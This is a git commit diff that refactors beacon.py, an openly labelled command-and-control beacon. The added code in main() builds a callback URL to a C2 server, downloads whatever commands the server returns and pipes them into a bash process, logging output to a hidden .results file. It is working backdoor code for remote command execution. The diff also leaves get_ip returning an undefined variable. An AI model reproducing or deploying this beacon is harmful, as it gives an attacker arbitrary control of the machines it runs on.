d6713c3dec06cb8ea6abd862bb3e27fba038d974
degenerat3 <james.maskelony@gmail.com>
2019-04-03 20:39:59 -0400

    beacon refac

--- beacon.py
+++ beacon.py
@@ -4,10 +4,7 @@ Hit dat C2, get dem commands
 
 def get_ip():
     # Get the preffered IP of the local machine
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect(("8.8.8.8", 80))
-    ip = s.getsockname()[0]
-    s.close
+    
     return ip
 
 def callback(ip, server):
@@ -30,9 +27,24 @@ def main():
     import sys
     from subprocess import *
 
-    SERVER_IP = "127.0.0.1:5000"    # C2 IP:port
-    ip = get_ip()
-    callback(ip, SERVER_IP)
+    server = "127.0.0.1:5000"    # C2 IP:port
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    ip = s.getsockname()[0]
+    s.close
+    cb_url = "http://" + server + "/" + ip + "/enderman"
+    try:
+        import urllib.request as urllib
+    except:
+        import urllib
+    code = urllib.urlopen(cb_url).readlines()
+    out = open(".results","w")
+    p = Popen("bash", stdin=PIPE, stdout=out, stderr=out)
+    for line in code:
+        p.stdin.write(line)
+    p.communicate()
+    out.close()
 
 import __main__
 try:
